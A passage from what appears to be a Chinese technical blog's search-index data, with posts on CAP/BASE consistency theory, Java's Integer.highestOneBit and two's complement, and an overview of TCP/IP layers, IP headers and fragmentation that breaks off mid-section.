一个数据存储系统不可能同时满足上述三个特性，只能同时满足其两个特性，也就是： CA,CP,AP。可以这么说，当前所有的数据存储解决方案，都可以归类的上述三种类型。 CA 满足数据的一致性和高可用性，但没有可扩展性，如传统的关系型数据，基本上满足是这个解决方案，如ORACLE , MYSQL 的单节点，满足数据的一致性和高可用性。 CP 满足数据的一致性和分区性，如Oracle RAC ，Sybase 集群。虽然Oracle RAC具备一点的扩展性，但当节点达到一定数目时，性能（也即可用性）就会下降很快，并且节点之间的网络开销还在，需要实时同步各节点之间的数据。 AP 在性能和可扩展性方面表现不错，但在数据一致性方面会用牺牲，各节点的之间数据同步没有哪么快，但能保存数据的最终一致性。当前热炒的NOSQL大多类是典型的AP类型数据库。 BASE理论BASE是Basically Available（基本可用）、Soft state（软状态）和Eventually consistent（最终一致性）三个短语的简写，BASE是对CAP中一致性和可用性权衡的结果，其来源于对大规模互联网系统分布式实践的结论，是基于CAP定理逐步演化而来的，其核心思想是即使无法做到强一致性（Strong consistency），但每个应用都可以根据自身的业务特点，采用适当的方式来使系统达到最终一致性（Eventual consistency）。接下来我们着重对BASE中的三要素进行详细讲解。 基本可用 基本可用是指分布式系统在出现不可预知故障的时候，允许损失部分可用性——但请注意，这绝不等价于系统不可用，以下两个就是“基本可用”的典型例子。 响应时间上的损失：正常情况下，一个在线搜索引擎需要0.5秒内返回给用户相应的查询结果，但由于出现异常（比如系统部分机房发生断电或断网故障），查询结果的响应时间增加到了1~2秒。功能上的损失：正常情况下，在一个电子商务网站上进行购物，消费者几乎能够顺利地完成每一笔订单，但是在一些节日大促购物高峰的时候，由于消费者的购物行为激增，为了保护购物系统的稳定性，部分消费者可能会被引导到一个降级页面。弱状态也称为软状态，和硬状态相对，是指允许系统中的数据存在中间状态，并认为该中间状态的存在不会影响系统的整体可用性，即允许系统在不同节点的数据副本之间进行数据听不的过程存在延时。 最终一致性 最终一致性强调的是系统中所有的数据副本，在经过一段时间的同步后，最终能够达到一个一致的状态。因此，最终一致性的本质是需要系统保证最终数据能够达到一致，而不需要实时保证系统数据的强一致性 亚马逊首席技术官Werner Vogels在于2008年发表的一篇文章中对最终一致性进行了非常详细的介绍。他认为最终一致性时一种特殊的弱一致性：系统能够保证在没有其他新的更新操作的情况下，数据最终一定能够达到一致的状态，因此所有客户端对系统的数据访问都能够胡渠道最新的值。同时，在没有发生故障的前提下，数据达到一致状态的时间延迟，取决于网络延迟，系统负载和数据复制方案设计等因素。 在实际工程实践中，最终一致性存在以下五类主要变种。 因果一致性： 因果一致性是指，如果进程A在更新完某个数据项后通知了进程B，那么进程B之后对该数据项的访问都应该能够获取到进程A更新后的最新值，并且如果进程B要对该数据项进行更新操作的话，务必基于进程A更新后的最新值，即不能发生丢失更新情况。与此同时，与进程A无因果关系的进程C的数据访问则没有这样的限制。 读己之所写： 读己之所写是指，进程A更新一个数据项之后，它自己总是能够访问到更新过的最新值，而不会看到旧值。也就是说，对于单个数据获取者而言，其读取到的数据一定不会比自己上次写入的值旧。因此，读己之所写也可以看作是一种特殊的因果一致性。 会话一致性： 会话一致性将对系统数据的访问过程框定在了一个会话当中：系统能保证在同一个有效的会话中实现“读己之所写”的一致性，也就是说，执行更新操作之后，客户端能够在同一个会话中始终读取到该数据项的最新值。 单调读一致性： 单调读一致性是指如果一个进程从系统中读取出一个数据项的某个值后，那么系统对于该进程后续的任何数据访问都不应该返回更旧的值。 单调写一致性： 单调写一致性是指，一个系统需要能够保证来自同一个进程的写操作被顺序地执行。 以上就是最终一致性的五类常见的变种，在时间系统实践中，可以将其中的若干个变种互相结合起来，以构建一个具有最终一致性的分布式系统。事实上，可以将其中的若干个变种相互结合起来，以构建一个具有最终一致性特性的分布式系统。事实上，最终一致性并不是只有那些大型分布式系统才设计的特性，许多现代的关系型数据库都采用了最终一致性模型。在现代关系型数据库中，大多都会采用同步和异步方式来实现主备数据复制技术。在同步方式中，数据的复制国耻鞥通常是更新事务的一部分，因此在事务完成后，主备数据库的数据就会达到一致。而在异步方式中，备库的更新往往存在延时，这取决于事务日志在主备数据库之间传输的时间长短，如果传输时间过长或者甚至在日志传输过程中出现异常导致无法及时将事务应用到备库上，那么狠显然，从备库中读取的的数据将是旧的，因此就出现了不一致的情况。当然，无论是采用多次重试还是认为数据订正，关系型数据库还是能搞保证最终数据达到一致——这就是系统提供最终一致性保证的经典案例。 总的来说，BASE理论面向的是大型高可用可扩展的分布式系统，和传统事务的ACID特性使相反的，它完全不同于ACID的强一致性模型，而是提出通过牺牲强一致性来获得可用性，并允许数据在一段时间内是不一致的，但最终达到一致状态。但同时，在实际的分布式场景中，不同业务单元和组件对数据一致性的要求是不同的，因此在具体的分布式系统架构设计过程中，ACID特性与BASE理论往往又会结合在一起使用。 小结：计算机系统从集中式向分布式的变革随着包括分布式网络、分布式事务和分布式数据一致性等在内的一系列问题与挑战，同时也催生了一大批诸如ACID、CAP和BASE等经典理论的快速发展。 参考资料 《从PAXOS到ZOOKEEPER分布式一致性原理与实践》 分散式系统—智库百科 Distributed computing","updated":"2020-07-19T00:23:27.847Z","tags":[{"name":"分布式","slug":"分布式","permalink":"http://xwolf191.github.io/tags/分布式/"}]},{"title":"Integer.highestOneBit(i)源码解读","date":"2017-12-19T06:30:00.000Z","path":"2017/12/19/java/Integer.highestOneBit(i)源码解读/","text":"Integer.highestOneBit(i)作用是取i这个数的二进制形式最左边的最高一位且高位后面全部补零,最后返回int型的结果。 highestOneBit 源码 12345678910111213141516171819@Test public void test()&#123; int i = 100; System.out.println(Integer.toBinaryString(i));//1100100 i |= (i &gt;&gt; 1); System.out.println(\"1:\"+Integer.toBinaryString(i));//1110110 i |= (i &gt;&gt; 2); System.out.println(\"2:\"+Integer.toBinaryString(i));//1111111 i |= (i &gt;&gt; 4); System.out.println(\"3:\"+Integer.toBinaryString(i));//1111111 i |= (i &gt;&gt; 8); System.out.println(\"4:\"+Integer.toBinaryString(i));//1111111 i |= (i &gt;&gt; 16); System.out.println(\"5:\"+Integer.toBinaryString(i));//1111111 int res = i - (i &gt;&gt;&gt; 1); System.out.println(res);//64 System.out.println(Integer.toBinaryString(res));//1000000 &#125; 运算描述： >&gt; 右移运算,转化为对应的二进制数右移n位,高位补0 &lt;&lt; 左移运算,,转化为对应的二进制数左移n位,高位补0 >&gt;&gt; 无符号右移,无符号右移的规则只记住一点：忽略了符号位扩展,0补最高位。无符号右移运算符&gt;&gt;&gt; 只是对32位和64位的值有意义。 补充 负数计算二进制 假设有一 int 类型的数,值为5，那么我们知道它在计算机中表示为:00000000 00000000 00000000 00000101。5转换成二制是101,不过int类型的数占用4字节（32位），所以前面填了一堆0。现在想知道，-5在计算机中如何表示？ 在计算机中，负数以其正值的补码形式表达。什么叫补码呢？这得从原码，反码说起。 原码：一个整数，按照绝对值大小转换成的二进制数，称为原码。比如 00000000 00000000 00000000 00000101 是 5的 原码。 反码：将二进制数按位取反，所得的新二进制数称为原二进制数的反码。取反操作指：原为1，得0；原为0，得1。（1变0; 0变1）比如：将00000000 00000000 00000000 00000101每一位取反，得11111111 11111111 11111111 11111010。称：11111111 11111111 11111111 11111010 是 00000000 00000000 00000000 00000101 的反码。反码是相互的，所以也可称：11111111 11111111 11111111 11111010 和 00000000 00000000 00000000 00000101 互为反码。 补码：反码加1称为补码。也就是说，要得到一个数的补码，先得到反码，然后将反码加上1，所得数称为补码。比如：00000000 00000000 00000000 00000101 的反码是：11111111 11111111 11111111 11111010。那么，补码为：11111111 11111111 11111111 11111010 + 1 = 11111111 11111111 11111111 11111011所以，-5 在计算机中表达为：11111111 11111111 11111111 11111011。转换为十六进制：0xFFFFFFFB。 位运算 A B &amp;（与） 或 ^(异或) 0 1 0 1 1 0 0 0 0 0 1 0 0 1 1 1 1 1 1 0","updated":"2020-07-19T00:23:27.850Z","tags":[{"name":"java","slug":"java","permalink":"http://xwolf191.github.io/tags/java/"}]},{"title":"TCP/IP详解","date":"2017-11-24T07:30:00.000Z","path":"2017/11/24/distributed/TCP IP概述/","text":"Transmission Control Protocol/Internet Protocol的简写，中译名为传输控制协议/因特网互联协议，又名网络通讯协议，是Internet最基本的协议、Internet国际互联网络的基础，由网络层的IP协议和传输层的TCP协议组成。TCP/IP 定义了电子设备如何连入因特网，以及数据如何在它们之间传输的标准。协议采用了4层的层级结构，每一层都呼叫它的下一层所提供的协议来完成自己的需求。通俗而言：TCP负责发现传输的问题，一有问题就发出信号，要求重新传输，直到所有数据安全正确地传输到目的地。而IP是给因特网的每一台联网设备规定一个地址。 TCP/IP概述协议分层 TCP/IP四层模型和OSI七层模型 TCP/IP四层模型 在TCP/IP参考模型中，去掉了OSI参考模型中的会话层和表示层（这两层的功能被合并到应用层实现）。同时将OSI参考模型中的数据链路层和物理层合并为主机到网络层。下面，分别介绍各层的主要功能。 链路层 实际上TCP/IP参考模型没有真正描述这一层的实现，只是要求能够提供给其上层-网络互连层一个访问接口，以便在其上传递IP分组。由于这一层次未被定义，所以其具体的实现方法将随着网络类型的不同而不同。 网络层 网络互连层是整个TCP/IP协议栈的核心。它的功能是把分组发往目标网络或主机。同时，为了尽快地发送分组，可能需要沿不同的路径同时进行分组传递。因此，分组到达的顺序和发送的顺序可能不同，这就需要上层必须对分组进行排序。 网络互连层定义了分组格式和协议，即IP协议（Internet Protocol）。 网络互连层除了需要完成路由的功能外，也可以完成将不同类型的网络（异构网）互连的任务。除此之外，网络互连层还需要完成拥塞控制的功能。 传输层 在TCP/IP模型中，传输层的功能是使源端主机和目标端主机上的对等实体可以进行会话。在传输层定义了两种服务质量不同的协议。即：传输控制协议TCP（transmission control protocol）和用户数据报协议UDP（user datagram protocol）。 TCP协议是一个面向连接的、可靠的协议。它将一台主机发出的字节流无差错地发往互联网上的其他主机。在发送端，它负责把上层传送下来的字节流分成报文段并传递给下层。在接收端，它负责把收到的报文进行重组后递交给上层。TCP协议还要处理端到端的流量控制，以避免缓慢接收的接收方没有足够的缓冲区接收发送方发送的大量数据。 UDP协议是一个不可靠的、无连接协议，主要适用于不需要对报文进行排序和流量控制的场合。 应用层 TCP/IP模型将OSI参考模型中的会话层和表示层的功能合并到应用层实现。 应用层面向不同的网络应用引入了不同的应用层协议。其中，有基于TCP协议的，如文件传输协议（File Transfer Protocol，FTP）、虚拟终端协议（TELNET）、超文本链接协议（Hyper Text Transfer Protocol，HTTP），也有基于UDP协议的。 OSI七层模型 OSI（Open System Interconnection，开放系统互连）七层网络模型称为开放式系统互联参考模型 ，是一个逻辑上的定义，一个规范，它把网络从逻辑上分为了7层。每一层都有相关、相对应的物理设备，比如路由器，交换机。OSI 七层模型是一种框架性的设计方法 ，建立七层模型的主要目的是为解决异种网络互连时所遇到的兼容性问题，其最主要的功能使就是帮助不同类型的主机实现数据传输。它的最大优点是将服务、接口和协议这三个概念明确地区分开来，通过七个层次化的结构模型使不同的系统不同的网络之间实现可靠的通讯。 模型优点 建立七层模型的主要目的是为解决异种网络互连时所遇到的兼容性问题。它的最大优点是将服务、接口和协议这三个概念明确地区分开来：服务说明某一层为上一层提供一些什么功能，接口说明上一层如何使用下层的服务，而协议涉及如何实现本层的服务；这样各层之间具有很强的独立性，互连网络中各实体采用什么样的协议是没有限制的，只要向上提供相同的服务并且不改变相邻层的接口就可以了。网络七层的划分也是为了使网络的不同功能模块（不同层次）分担起不同的职责，从而带来如下好处： 减轻问题的复杂程度，一旦网络发生故障，可迅速定位故障所处层次，便于查找和纠错； 在各层分别定义标准接口，使具备相同对等层的不同网络设备能实现互操作，各层之间则相对独立，一种高层协议可放在多种低层协议上运行； 能有效刺激网络技术革新，因为每次更新都可以在小范围内进行，不需对整个网络动大手术； 便于研究和教学。 物理层（Physical Layer） O S I 模型的最低层或第一层，该层包括物理连网媒介，如电缆连线连接器。物理层的协议产生并检测电压以便发送和接收携带数据的信号。在你的桌面P C 上插入网络接口卡，你就建立了计算机连网的基础。换言之，你提供了一个物理层。尽管物理层不提供纠错服务，但它能够设定数据传输速率并监测数据出错率。网络物理问题，如电线断开，将影响物理层。 用户要传递信息就要利用一些物理媒体，如双绞线、同轴电缆等，但具体的物理媒体并不在OSI的7层之内，有人把物理媒体当做第0层，物理层的任务就是为它的上一层提供一个物理连接，以及它们的机械、电气、功能和过程特性。如规定使用电缆和接头的类型、传送信号的电压等。在这一层，数据还没有被组织，仅作为原始的位流或电气电压处理，单位是bit比特。 数据链路层（Datalink Layer） OSI模型的第二层，它控制网络层与物理层之间的通信。它的主要功能是如何在不可靠的物理线路上进行数据的可靠传递。为了保证传输，从网络层接收到的数据被分割成特定的可被物理层传输的帧。帧是用来移动数据的结构包，它不仅包括原始数据，还包括发送方和接收方的物理地址以及检错和控制信息。其中的地址确定了帧将发送到何处，而纠错和控制信息则确保帧无差错到达。 如果在传送数据时，接收点检测到所传数据中有差错，就要通知发送方重发这一帧。 数据链路层的功能独立于网络和它的节点和所采用的物理层类型，它也不关心是否正在运行 Word、Excel 或使用Internet。有一些连接设备，如交换机，由于它们要对帧解码并使用帧信息将数据发送到正确的接收方，所以它们是工作在数据链路层的。 数据链路层（DataLinkLayer):在物理层提供比特流服务的基础上，建立相邻结点之间的数据链路，通过差错控制提供数据帧（Frame）在信道上无差错的传输，并进行各电路上的动作系列。 数据链路层在不可靠的物理介质上提供可靠的传输。该层的作用包括：物理地址寻址、数据的成帧、流量控制、数据的检错、重发等。 数据链路层协议的代表包括：SDLC、HDLC、PPP、STP、帧中继等。 网络层（Network Layer） O S I 模型的第三层，其主要功能是将网络地址翻译成对应的物理地址，并决定如何将数据从发送方路由到接收方。 网络层通过综合考虑发送优先权、网络拥塞程度、服务质量以及可选路由的花费来决定从一个网络中节点A 到另一个网络中节点B 的最佳路径。由于网络层处理，并智能指导数据传送，路由器连接网络各段，所以路由器属于网络层。在网络中，“路由”是基于编址方案、使用模式以及可达性来指引数据的发送。 网络层负责在源机器和目标机器之间建立它们所使用的路由。这一层本身没有任何错误检测和修正机制，因此，网络层必须依赖于端端之间的由D L L提供的可靠传输服务。 网络层用于本地L A N网段之上的计算机系统建立通信，它之所以可以这样做，是因为它有自己的路由地址结构，这种结构与第二层机器地址是分开的、独立的。这种协议称为路由或可路由协议。路由协议包括Ip、Novell公司的IPX以及Appe Talk协议。 网络层是可选的，它只用于当两个计算机系统处于不同的由路由器分割开的网段这种情况，或者当通信应用要求某种网络层或传输层提供的服务、特性或者能力时。例如，当两台主机处于同一个LAN网段的直接相连这种情况，它们之间的通信只使用LAN的通信机制就可以了(即OSI 参考模型的一二层)。 传输层（Transport Layer） OSI模型中最重要的一层。传输协议同时进行流量控制或是基于接收方可接收数据的快慢程度规定适当的发送速率。除此之外，传输层按照网络能处理的最大尺寸将较长的数据包进行强制分割。例如，以太网无法接收大于1 5 0 0 字节的数据包。发送方节点的传输层将数据分割成较小的数据片，同时对每一数据片安排一序列号，以便数据到达接收方节点的传输层时，能以正确的顺序重组。该过程即被称为排序。 工作在传输层的一种服务是 TCP/IP协议套中的TCP(传输控制协议），另一项传输层服务是IPX/SPX 协议集的SPX（序列包交换）。 会话层（Session Layer） 负责在网络中的两节点之间建立、维持和终止通信。 会话层的功能包括：建立通信链接，保持会话过程通信链接的畅通，同步两个节点之间的对话，决定通信是否被中断以及通信中断时决定从何处重新发送。 你可能常常听到有人把会话层称作网络通信的“交通警察”。当通过拨号向你的 ISP （因特网服务提供商）请求连接到因特网时，ISP 服务器上的会话层向你与你的 PC 客户机上的会话层进行协商连接。若你的电话线偶然从墙上插孔脱落时，你终端机上的会话层将检测到连接中断并重新发起连接。会话层通过决定节点通信的优先级和通信时间的长短来设置通信期限. 表示层（Presentation Layer） 应用程序和网络之间的翻译官，在表示层，数据将按照网络能理解的方案进行格式化；这种格式化也因所使用网络的类型不同而不同。 表示层管理数据的解密与加密，如系统口令的处理。例如：在 Internet上查询你银行账户，使用的即是一种安全连接。你的账户数据在发送前被加密，在网络的另一端，表示层将对接收到的数据解密。除此之外，表示层协议还对图片和文件格式信息进行解码和编码。 应用层（Application Layer） 应用层也称为应用实体（AE），它由若干个特定应用服务元素（SASE）和一个或多个公用应用服务元素（CASE）组成。每个SASE提供特定的应用服务，例如文件运输访问和管理（FTAM）、电子文电处理（MHS）、虚拟终端协议（VAP）等。CASE提供一组公用的应用服务，例如联系控制服务元素（ACSE）、可靠运输服务元素（RTSE）和远程操作服务元素（ROSE）等。主要负责对软件提供接口以使程序能使用网络服务。术语“应用层”并不是指运行在网络上的某个特别应用程序 ，应用层提供的服务包括文件传输、文件管理以及电子邮件的信息处理。 IP协议 IP是英文Internet Protocol的缩写，意思是“网络之间互连的协议”，也就是为计算机网络相互连接进行通信而设计的协议。在因特网中，它是能使连接到网上的所有计算机网络实现相互通信的一套规则，规定了计算机在因特网上进行通信时应当遵守的规则。任何厂家生产的计算机系统，只要遵守IP协议就可以与因特网互连互通。正是因为有了IP协议，因特网才得以迅速发展成为世界上最大的、开放的计算机通信网络。因此，IP协议也可以叫做“因特网协议”。 IP数据报 TCP/IP协议定义了一个在因特网上传输的包，称为IP数据包，而IP数据报(IP Datagram)是个比较抽象的内容，是对数据包的结构进行分析。 由首部和数据两部分组成，其格式如图所示。首部的前一部分是固定长度，共20字节，是所有IP数据报必须具有的。在首部的固定部分的后面是一些可选字段，其长度是可变的。首部中的源地址和目的地址都是IP协议地址。 固定部分 (1)版本 占4位,指IP协议的版本。通信双方使用的IP协议版本必须一致。目前广泛使用的IP协议版本号为4（即IPv4)。 (2)首部长度 占4位，可表示的最大十进制数值是15。请注意，这个字段所表示数的单位是32位字长（1个32位字长是4字节），因此，当IP的首部长度为1111时（即十进制的15），首部长度就达到60字节。当IP分组的首部长度不是4字节的整数倍时，必须利用最后的填充字段加以填充。因此数据部分永远在4字节的整数倍开始，这样在实现IP协议时较为方便。首部长度限制为60字节的缺点是有时可能不够用。但这样做是希望用户尽量减少开销。最常用的首部长度就是20字节（即首部长度为0101），这时不使用任何选项。 (3)区分服务 占8位，用来获得更好的服务。这个字段在旧标准中叫做服务类型，但实际上一直没有被使用过。1998年IETF把这个字段改名为区分服务DS(Differentiated Services)。只有在使用区分服务时，这个字段才起作用。(4)总长度 总长度指首部和数据之和的长度，单位为字节。总长度字段为16位，因此数据报的最大长度为2^16-1=65535字节。在IP层下面的每一种数据链路层都有自己的帧格式，其中包括帧格式中的数据字段的最大长度，这称为最大传送单元MTU(Maximum Transfer Unit)。当一个数据报封装成链路层的帧时，此数据报的总长度（即首部加上数据部分）一定不能超过下面的数据链路层的MTU值。(5)标识(identification) 占16位。IP软件在存储器中维持一个计数器，每产生一个数据报，计数器就加1，并将此值赋给标识字段。但这个“标识”并不是序号，因为IP是无连接服务，数据报不存在按序接收的问题。当数据报由于长度超过网络的MTU而必须分片时，这个标识字段的值就被复制到所有的数据报的标识字段中。相同的标识字段的值使分片后的各数据报片最后能正确地重装成为原来的数据报。(6)标志(flag) 占3位，但目前只有2位有意义。 标志字段中的最低位记为MF(MoreFragment)。MF=1即表示后面“还有分片”的数据报。MF=0表示这已是若干数据报片中的最后一个。 标志字段中间的一位记为DF(Don’t Fragment)，意思是“不能分片”。只有当DF=0时才允许分片。 (7)片偏移 占13位。片偏移指出：较长的分组在分片后，某片在原分组中的相对位置。也就是说，相对用户数据字段的起点，该片从何处开始。片偏移以8个字节为偏移单位。这就是说，除了最后一个分片，每个分片的长度一定是8字节（64位）的整数倍。(8)生存时间 占8位，生存时间字段常用的的英文缩写是TTL(Time To Live)，表明是数据报在网络中的寿命。由发出数据报的源点设置这个字段。其目的是防止无法交付的数据报无限制地在因特网中兜圈子，因而白白消耗网络资源。最初的设计是以秒作为TTL的单位。每经过一个路由器时，就把TTL减去数据报在路由器消耗掉的一段时间。若数据报在路由器消耗的时间小于1秒，就把TTL值减1。当TTL值为0时，就丢弃这个数据报。后来把TTL字段的功能改为“跳数限制”（但名称不变）。路由器在转发数据报之前就把TTL值减1.若TTL值减少到零，就丢弃这个数据报，不再转发。因此，现在TTL的单位不再是秒，而是跳数。TTL的意义是指明数据报在网络中至多可经过多少个路由器。显然，数据报在网络上经过的路由器的最大数值是255.若把TTL的初始值设为1，就表示这个数据报只能在本局域网中传送。 TTL的作用是限制IP数据包在计算机网络中的存在的时间。TTL的最大值是255，TTL的一个推荐值是64。虽然TTL从字面上翻译，是可以存活的时间，但实际上TTL是IP数据包在计算机网络中可以转发的最大跳数。TTL字段由IP数据包的发送者设置，在IP数据包从源到目的的整个转发路径上，每经过一个路由器，路由器都会修改这个TTL字段值，具体的做法是把该TTL的值减1，然后再将IP包转发出去。如果在IP包到达目的IP之前，TTL减少为0，路由器将会丢弃收到的TTL=0的IP包并向IP包的发送者发送 ICMP time exceeded消息。TTL的主要作用是避免IP包在网络中的无限循环和收发，节省了网络资源，并能使IP包的发送者能收到告警消息。TTL 是由发送主机设置的，以防止数据包不断在IP互联网络上永不终止地循环。转发IP数据包时，要求路由器至少将 TTL 减小 1。生存时间，就是一条域名解析记录在DNS服务器中的存留时间。当各地的DNS服务器接受到解析请求时，就会向域名指定的NS服务器(权威域名服务器）发出解析请求从而获得解析记录；在获得这个记录之后，记录会在DNS服务器(各地的缓存服务器，也叫递归域名服务器）中保存一段时间，这段时间内如果再接到这个域名的解析请求，DNS服务器将不再向NS服务器发出请求，而是直接返回刚才获得的记录；而这个记录在DNS服务器上保留的时间，就是TTL值。 (9)协议 占8位，协议字段指出此数据报携带的数据是使用何种协议，以便使目的主机的IP层知道应将数据部分上交给哪个处理过程。(10)首部检验和 占16位。这个字段只检验数据报的首部，但不包括数据部分。这是因为数据报每经过一个路由器，路由器都要重新计算一下首部检验和（一些字段，如生存时间、标志、片偏移等都可能发生变化）。不检验数据部分可减少计算的工作量。(11)源地址 占32位。(12)目的地址 占32位。 可变部分 IP首部的可变部分就是一个可选字段。选项字段用来支持排错、测量以及安全等措施，内容很丰富。此字段的长度可变，从1个字节到40个字节不等，取决于所选择的项目。某些选项项目只需要1个字节，它只包括1个字节的选项代码。但还有些选项需要多个字节，这些选项一个个拼接起来，中间不需要有分隔符，最后用全0的填充字段补齐成为4字节的整数倍。增加首部的可变部分是为了增加IP数据报的功能，但这同时也使得IP数据报的首部长度成为可变的。这就增加了每一个路由器处理数据报的开销。实际上这些选项很少被使用。新的IP版本IPv6就将IP数据报的首部长度做成固定的。目前，这些任选项定义如下：（1）安全和处理限制（用于军事领域）（2）记录路径（让每个路由器都记下它的IP地址）（3）时间戳（Time Stamp）（让每个路由器都记下IP数据报经过每一个路由器的IP地址和当地时间）（4）宽松的源站路由（Loose Source Route）（为数据报指定一系列必须经过的IP地址）（5）严格的源站路由（Strict Source Route） （与宽松的源站路由类似，但是要求只能经过指定的这些地址，不能经过其他的地址) 这些选项很少被使用，并非所有主机和路由器都支持这些选项。 IP分组和重组IP分片IP分片的原理 分片和重新组装的过程对传输层是透明的，其原因是当IP数据报进行分片之后，只有当它到达下一站时，才可进行重新组装，且它是由目的端的IP层来完成的。分片之后的数据报根据需要也可以再次进行分片。IP分片和完整IP报文差不多拥有相同的IP头，ID域对于每个分片都是一致的，这样才能在重新组装的时候识别出来自同一个IP报文的分片。在IP头里面，16位识别号唯一记录了一个IP包的ID（ipid），具有同一个ID的IP分片将会重新组装；而13位片偏移则记录了某IP片相对整个包的位置；而这两个表中间的3位标志则标志着该分片后面是否还有新的分片。这三个域就组成了IP分片的所有信息， 接受方就可以利用这些信息对IP数据进行重新组织。 1、标志字段的作用 标志字段在分片数据报中起了很大作用，在数据报分片时把它的值复制到每片中。标志字段的其中一个比特称作“不分片”位，用其中一个比特来表示“更多的片”。除了最后一片外，其他每个组成数据报的片都要把该比特置1。片偏移字段指的是该片偏移原始数据报开始处的位置。另外，当数据报被分片后，每个片的总长度值要改为该片的长度值。如果将标志字段的”不分片”比特置1，则IP将不对数据报进行分片。相反把数据报丢弃并发送一个I C M P差错报文并通知源主机废弃的原因。如果不是特殊需要，则不应该置1；最右比特置1表示该报文不是最后一个IP分片。 故意发送部分IP分片而不是全部，则会导致目标主机总是等待分片消耗并占用系统资源。某些分片风暴攻击就是这种原理。 这里以以太网为例，由于以太网传输电气方面的限制，每个以太网帧都有最小的大小64bytes最大不能超过1518bytes， 抛去以太网帧的帧头(DMAC目的MAC地址48bit=6Bytes+SMAC源MAC地址48bit=6Bytes+Type域2bytes)14Bytes和帧尾CRC校验部分4Bytes，那么剩下承载上层协议的地方也就是Data域最大就只能有1500Bytes，这就是前面所说的MTU的值。这个也是网络层协议非常关心的地方，因为网络层的IP协议会根据这个值来决定是否把上层传达下来的数据进行分片。就好比一个盒子没法装下一大块面包，我们需要把面包切成片，装在多个盒子里面一样的道理。 2、MTU原理 当两台远程PC互联的时候，它们的数据需要穿过很多的路由器和各种各样的网络媒介才能到达对端，网络中不同媒介的MTU各不相同，就好比一长段的水管，由不同粗细的水管组成(MTU不同 )通过这段水管最大水量就要由中间最细的水管决定。 对于网络层的上层协议而言(这里以TCP/IP协议族为例)它们对水管粗细不在意它们认为这个是网络层的事情。网络层IP协议会检查每个从上层协议下来的数据包的大小，并根据本机MTU的大小决定是否作“分片”处理。分片最大的坏处就是降低了传输性能，本来一次可以搞定的事情，分成多次搞定，所以在网络层更高一层(就是传输层)的实现中往往会对此加以注意!有些高层因为某些原因就会要求我这个面包不能切片，我要完整地面包，所以会在IP数据包包头里面加上一个标签:DF(Donot Fragment)。这样当这个IP数据包在一大段网络(水管里面)传输的时候，如果遇到MTU小于IP数据包的情况，转发设备就会根据要求丢弃这个数据包。然后返回一个错误信息给发送者。这样往往会造成某些通讯上的问题，不过幸运的是大部分网络链路MTU都是1500或者大于1500。 对于UDP协议而言，这个协议本身是无连接的协议，对数据包的到达顺序以及是否正确到达不甚关心，所以一般UDP应用对分片没有特殊要求。 对于TCP协议而言就不一样了，这个协议是面向连接的协议，对于TCP协议而言它非常在意数据包的到达顺序以及是否传输中有错误发生。所以有些TCP应用对分片有要求—-不能分片(DF)。 3、MSS的原理 MSS就是TCP数据包每次能够传输的最大数据分段。为了达到最佳的传输效能TCP协议在建立连接的时候通常要协商双方的MSS值，这个值TCP协议在实现的时候往往用MTU值代替(需要减去IP数据包包头的大小20Bytes和TCP数据段的包头20Bytes)所以往往MSS为1460。通讯双方会根据双方提供的MSS值得最小值确定为这次连接的最大MSS值。 当IP数据报被分片后，每一片都成为一个分组，具有自己的IP首部，并在选择路由时与其他分组独立。这样，当数据报的这些片到达目的端时有可能会失序，但是在IP首部中有足够的信息让接收端能正确组装这些数据报片。 尽管IP分片过程看起来是透明的，但有一点让人不想使用它：即使只丢失一片数据也要重传整个数据报。因为IP层本身没有超时重传的机制——由更高层来负责超时和重传（T C P有超时和重传机制，但UDP没有。一些UDP应用程序本身也执行超时和重传）。当来自T C P报文段的某一片丢失后，T C P在超时后会重发整个T C P报文段，该报文段对应于一份IP数据报。没有办法只重传数据报中的一个数据报片。 IP分片的步骤 一个未分片的数据报的分片信息字段全为0，即多个分片标志位为0，并且片偏移量为0。分片一个数据报，需执行以下几个步骤： 检查DF标志位，查明是否允许分片。如果设置了该位，则数据报将被丢弃，并将一个ICMP错误返回给源端. 基于MTU值，把数据字段分成两个部分或者多个部分。除了最后的数据部分外，所有新建数据选项的长度必须为8个字节的倍数。 每个数据部分被放入一个IP数据报。这些数据报的报文头略微修改了原来的报文头。 除了最后的数据报分片外，所有分片都设置了多个分片标志位。 每个分片中的片偏移量字段设为这个数据部分在原来数据报中所占的位置，这个位置相对于原来未分片数据报中的开头处。 如果在原来的数据报中包括了选项，则选项类型字节的高位字节决定了这个信息是被复制到所有分片数据报，还是只复制到第一个数据报。 设置新数据报的报文头字段及总长度字段。 重新计算报文头部校验和字段。 此时，这些分片数据报中的每个数据报如一个完整IP数据报一样被转发。IP独立地处理每个数据报分片。数据报分片能够通过不同的路由器到达目的。如果它们通过那些规定了更小的MTU网络，则还能够进一步对它们进行分片。在目的主机上，数据被重新组合成原来的数据报。发送主机设置的标识符字段与数据报中的源IP地址和目的IP地址一起使用。分片过程不改变这个字段。 重组 为了重新组合这些数据报分片，接收主机在第一个分片到达时分配一个存储缓冲区。这个主机还将启动一个计时器。当数据报的后续分片到达时，数据被复制到缓冲区存储器中片偏移量字段指出的位置。当所有分片都到达时，完整的未分片的原始数据包就被恢复了。处理如同未分片数据报一样继续进行。如果计时器超时并且分片保持尚未认可状态，则数据报被丢弃。这个计时器的初始值称为IP数据报的生存期值。它是依赖于实现的。一些实现允许对它进行配置。在某些IP主机上可以使用netstat命令列出分片的细节。如TCP/IP for OS/2中的netstat-i命令。重组的步骤：在接收方，一个由发送方发出的原始IP数据报，其所有分片将被重新组合，然后才能提交到上层协议。每一个将被重组的IP数据报都用一个ipq结构实例来表示，因此先来看看ipq这个非常重要的结构。为了能高效地组装分片，用于保存分片的数据结构必须能做到以下几点：1、快速定位属于某一个数据报的一组分组2、在属于某一个数据报的一组分片中快速插入新的分片3、有效地判断一个数据报的所有分片是否已经全部接收4、具有组装超时机制，如果在重组完成之前定时器溢出，则删除该数据报的所有内容 分类 现在的IP网络使用32位地址，以点分十进制表示，如172.16.0.0。地址格式为：IP地址=网络地址＋主机地址 或 IP地址=主机地址＋子网地址＋主机地址。 IP地址类型 最初设计互联网络时，为了便于寻址以及层次化构造网络，每个IP地址包括两个标识码（ID），即网络ID和主机ID。同一个物理网络上的所有主机都使用同一个网络ID，网络上的一个主机（包括网络上工作站，服务器和路由器等）有一个主机ID与其对应。IP地址根据网络ID的不同分为5种类型，A类地址、B类地址、C类地址、D类地址和E类地址。 A类IP地址 一个A类IP地址由1字节的网络地址和3字节主机地址组成，网络地址的最高位必须是“0”， 地址范围从1.0.0.0 到126.0.0.0。可用的A类网络有126个，每个网络能容纳1亿多个主机。 B类IP地址 